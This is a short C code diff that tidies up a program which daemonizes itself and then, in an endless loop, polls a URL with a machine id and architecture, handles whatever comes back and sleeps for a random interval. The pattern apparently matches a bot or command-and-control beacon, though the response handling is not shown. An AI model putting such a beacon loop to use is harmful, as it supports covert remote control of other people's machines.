@@ -67,21 +67,8 @@ int main(int argc, char *argv[])
 			exit(0);
 		}
 		else if (!pid1)
-		{
 			if (pid2 = fork())
-			{
 				exit(0);
-			}
-			else if (!pid2)
-			{
-			}
-			else
-			{
-			}
-		}
-		else
-		{
-		}
 		setsid();
 		chdir("/");
 		signal(SIGPIPE, SIG_IGN);
@@ -99,23 +86,23 @@ int main(int argc, char *argv[])
 		exit(0);
 	}
 	free(uwu);
+	request = ft_strjoin("?id=", id);
+	request = ft_strnjoinf(url_page, request, strlen(request));
+	request = ft_strnjoin(request, "&arch=", strlen(request));
+	request = ft_strnjoin(request, arch, strlen(request));
 	while (true)
 	{
-		request = ft_strjoin("?id=", id);
-		request = ft_strnjoinf(url_page, request, strlen(request));
-		request = ft_strnjoin(request, "&arch=", strlen(request));
-		request = ft_strnjoin(request, arch, strlen(request));
 		tmp = ft_request(request);
 		if (tmp)
 		{
 			ft_manage_request(tmp);
 			free(tmp);
 		}
-		free(request);
 		if (DEBUG)
 			usleep(250000);
 		else
 			sleep(rand() % 10);
 	}
+	free(request);
 	return (0);
 }
